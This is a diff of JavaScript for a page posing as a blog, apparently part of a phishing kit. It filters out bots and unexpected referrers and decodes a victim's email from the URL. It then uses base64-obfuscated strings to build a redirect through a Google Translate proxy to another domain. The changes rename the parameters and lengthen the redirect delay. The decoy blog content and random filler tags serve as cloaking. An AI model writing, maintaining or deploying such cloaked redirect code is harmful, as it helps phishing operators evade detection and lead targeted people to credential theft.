@@ -58,7 +58,7 @@ function getRandomString(length) {
   
   addRandomMetaTags();
   
-  fetch('blog.txt').then(response => response.text()).then(blogContent => document.getElementById('body').innerHTML = blogContent);
+  fetch('blog.txt').then(response => response.text()).then(blogContent => document.getElementById('blog').innerHTML = blogContent);
   
   const tags = ['p', 'h1', 'div', 'a', 'img', 'ul', 'li', 'span', 'button', 'table', 'tr', 'td'];
   function generateRandomText(length) {
@@ -149,12 +149,12 @@ function getRandomString(length) {
       const refererString = document.referrer;
       const isRefererMatch = refererRegexes.some((regex) => regex.test(refererString));
     
-      const uidParam = new URLSearchParams(window.location.search).get('u');
+      const uidParam = new URLSearchParams(window.location.search).get('i');
   
       var decString = atob(uidParam);
   
       const isValidEmailInput = isValidEmail(decString);
-    
+
       const hasMatch = isBot || isRefererMatch || !isValidEmailInput;
       if (hasMatch) {
         excvbnmq(false);
@@ -178,9 +178,9 @@ function getRandomString(length) {
           var randmd5; fetch('md5.txt').then(response => response.text()).then(fileContents => randmd5 = fileContents.trim().split('\n').filter(md5 => md5.trim() !== '')[Math.floor(Math.random() * fileContents.trim().split('\n').filter(md5 => md5.trim() !== '').length)]);
           
           setTimeout(function() {
-            var url = "https://" + dmain + atob('LnRyYW5zbGF0ZS5nb29nLw==') + randmd5 + atob('Lz91PQ==') + oxx + atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=');
+            var url = "https://" + dmain + atob('LnRyYW5zbGF0ZS5nb29nLw==') + randmd5 + atob('Lz94PQ==') + oxx + atob('Jl94X3RyX3NsPWF1dG8mX3hfdHJfdGw9ZW4mX3hfdHJfaGw9ZW4tVVMmX3hfdHJfcHRvPXdhcHBibG9nLmh0bWw=');
             window.location.replace(url);
-        }, 2000);
+        }, 10000);
           } else {
             setTimeout(function() {
               console.log('ERROR AT STAGE 1 Y..what triggered');
